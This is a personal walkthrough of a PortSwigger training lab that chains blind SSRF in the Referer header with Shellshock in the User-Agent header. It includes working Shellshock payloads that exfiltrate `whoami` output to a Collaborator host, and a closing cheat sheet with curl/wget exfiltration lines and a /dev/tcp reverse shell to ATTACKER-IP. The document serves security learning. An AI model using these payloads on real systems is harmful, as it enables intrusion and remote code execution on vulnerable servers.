// PortSwigger Labs ---> Platform
---
## Lab: 6 — Blind SSRF With Shellshock Exploitation
## Difficulty Level : 🔴 EXPERT


---

### Where I Found Vulnerability?
- **URL:** `/product?productId=1`
- **Parameters:** `User-Agent` header + `Referer` header
- **Two vulnerabilities chained:**
  - 🔗 Blind SSRF → hit the internal server via the `Referer` header
  - 💥 Shellshock (CVE-2014-6271) → RCE via the `User-Agent` header

---

### What is Shellshock? 🐚
> Shellshock is a **Bash vulnerability (2014)** in which a specially crafted environment variable causes **arbitrary commands to execute**.

```bash
# Normal Bash function:
greet() { echo "Hello"; }

# Shellshock Payload — command injected after the function:
() { :; }; echo "HACKED"
#    ↑              ↑
# Fake function    This gets executed!
```
- **CVE:** CVE-2014-6271
- **CVSS Score:** 10.0 (Maximum) 🚨
- **Affected:** Bash 1.0.3 → 4.3 (almost all old Linux servers)

---

### Steps?
1. Go to any product and intercept in Burp
2. Send the request to **Intruder**
3. Set `http://192.168.0.§X§:8080/` in the `Referer` header — make `X` the payload position
4. Put a **Shellshock payload** in the `User-Agent` header with the Collaborator URL:
```
() { :; }; curl http://YOUR-COLLABORATOR-ID.oastify.com/`whoami`
```
5. Run Intruder → bruteforce numbers `1-255` for the Referer IP
6. Go to Burp Collaborator → click **Poll Now**
7. Look at the URL path in the incoming HTTP request → `/peter-XXXXXX` — this is the OS username
8. Submit the username in the lab → ✅ Solved

---

### Working Payloads?

**User-Agent (Shellshock + OOB):**
```bash
() { :; }; curl http://48awt6rev5owyxnsl743bzjib9h25tti.oastify.com/`whoami`
```

**Referer (Blind SSRF - IP Bruteforce):**
```
http://192.168.0.X:8080/
```

**Payload Breakdown:**
```
() { :; };         ← Shellshock trigger (malformed bash function)
curl               ← Command that executes on the server
http://COLLAB/     ← Your Collaborator URL
`whoami`           ← Command substitution — output gets appended to the URL
                      Server → GET /peter-p0L6PW → Collaborator
```

---

### Why it Worked? 🧠

**Step 1 — Blind SSRF via Referer:**
- The server was fetching the `Referer` header's URL in the background
- There was an internal server at `192.168.0.X:8080` that used Bash CGI
- Bruteforcing the Referer found the right IP (167 or whichever) where the server was

**Step 2 — Shellshock via User-Agent:**
- The internal server's CGI script passed HTTP headers as **Bash environment variables**
- The `User-Agent` header became the `HTTP_USER_AGENT` environment variable
- Shellshock parsed this variable and executed `curl whoami`
- The output of `whoami` (`peter-XXXXXX`) got appended to the Collaborator URL
- The username showed up in the incoming request on Collaborator 👀

```
Attack Chain:
Burp Intruder
     ↓
Referer: 192.168.0.167:8080  ← Blind SSRF (internal server hit)
     ↓
Internal CGI Server (Bash)
     ↓
User-Agent parsed as env var  ← Shellshock triggers
     ↓
curl http://COLLABORATOR/`whoami`  ← RCE executed
     ↓
Collaborator receives: GET /peter-p0L6PW  ← Username leaked!
```

---

### What I Learned? 🎓

- 🔗 **Vulnerability Chaining** — one vulnerability alone can be weak, but chain them together and it's devastating: `Blind SSRF → Shellshock → RCE`
- 🐚 **Shellshock** only works on old servers, but is still found today in real bug bounty on legacy systems
- 📡 **Out-of-Band (OOB) Data Exfiltration** — the response wasn't visible, but the `whoami` output leaked through the Collaborator URL — this is gold in Blind scenarios
- 🎯 **HTTP Headers = Attack Surface** — don't just test URL parameters, also test `User-Agent`, `Referer`, `X-Forwarded-For`
- 🔢 **Intruder IP Bruteforce** — when the internal IP isn't known, fuzz the `1-255` range — the IP that returns 200 OK is the real server

---

### Shellshock Quick Reference 📋
```bash
# Basic Test
() { :; }; echo "Vulnerable"

# RCE via curl (OOB)
() { :; }; curl http://COLLABORATOR/`whoami`

# RCE via wget
() { :; }; wget http://COLLABORATOR/`id`

# Reverse Shell
() { :; }; bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

---

